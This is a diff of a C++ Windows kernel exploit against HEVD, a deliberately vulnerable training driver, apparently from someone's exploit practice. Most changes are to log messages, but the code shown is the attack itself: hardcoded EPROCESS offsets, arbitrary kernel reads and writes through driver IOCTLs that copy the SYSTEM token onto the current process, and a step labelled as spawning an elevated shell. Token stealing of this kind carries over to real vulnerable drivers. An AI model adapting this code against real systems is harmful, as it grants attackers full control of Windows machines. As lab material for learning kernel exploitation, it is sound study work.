@@ -52,7 +52,7 @@ u64 getKbAddr() {
 }
 
 int main() {
-	// offsets for later
+	// offsets for later. obtain thru windbg
 	const u64 TokenOffset = 0x248;
 	const u64 ActiveProcessLinksOffset = 0x1d8;
 	const u64 UniqueProcessIdOffset = 0x1d0;
@@ -81,8 +81,6 @@ int main() {
 
 	u64 ntoskrnlAddress = getKbAddr();
 	printf("[*] Ntoskrnl base address is: %p\n", ntoskrnlAddress);
-	printf("[+] Attempting to read from IOCTL\n\n");
-
 	//u64 testAddr = ReadQWORD(hHevdDriver, reinterpret_cast<PVOID>(ntoskrnlAddress));
 	//printf("[*] Value read from memory: %p\n", testAddr);
 
@@ -91,7 +89,7 @@ int main() {
 	u64 SystemProcessTokenPtr = ReadQWORD(hHevdDriver, reinterpret_cast<PBYTE>(PsInitialSystemProcessPtr) + TokenOffset);
 	printf("[*] SystemProcessTokenPtr: 0x%11x\n\n", SystemProcessTokenPtr);
 
-	printf("[+] Checking current process\n");
+	printf("[+] Checking current running process\n");
 	DWORD TargetPID = GetCurrentProcessId();
 	u64 ProcessHead = PsInitialSystemProcessPtr;
 
@@ -103,14 +101,13 @@ start:
 
 	u64 TargetProcessTokenCount = ReadQWORD(hHevdDriver, reinterpret_cast<PBYTE>(ProcessHead) + TokenOffset) & 15;
 	u64 FinalToken = TargetProcessTokenCount | SystemProcessTokenPtr;
-	printf("[*] Token has been prepared\n");
-
-	printf("[+] Stealing token\n\n");
+	printf("[+] Stealing token\n");
 	WriteQWORD(hHevdDriver, &FinalToken, reinterpret_cast<PBYTE>(ProcessHead) + TokenOffset);
-	printf("[+] Closing HEVD handle\n");
 	CloseHandle(hHevdDriver);
+	printf("[*] Operations completed, handle closed.\n\n");
 
 	// spawning new shell
+	printf("[+] Spawning new shell\n");
 	STARTUPINFOW StartupInfo{};
 	StartupInfo.cb = sizeof(StartupInfo);
 	PROCESS_INFORMATION ProcessInformation;
